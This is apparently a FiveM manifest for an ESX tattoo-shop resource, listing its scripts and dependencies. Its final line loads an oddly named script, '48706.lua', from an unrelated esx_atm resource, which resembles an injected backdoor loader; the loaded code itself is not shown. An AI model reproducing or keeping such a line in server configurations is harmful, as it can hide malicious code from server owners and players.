fx_version 'adamant'
game 'gta5'

shared_scripts {
	'@es_extended/locale.lua',
	'locales/es.lua',
	'config.lua'
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/main.lua'
}

client_scripts {
	'client/tattooList.lua',
	'client/main.lua'
}

dependencies {
	'es_extended',
	'skinchanger',
	'esx_skin'
}
client_script '@esx_atm/48706.lua'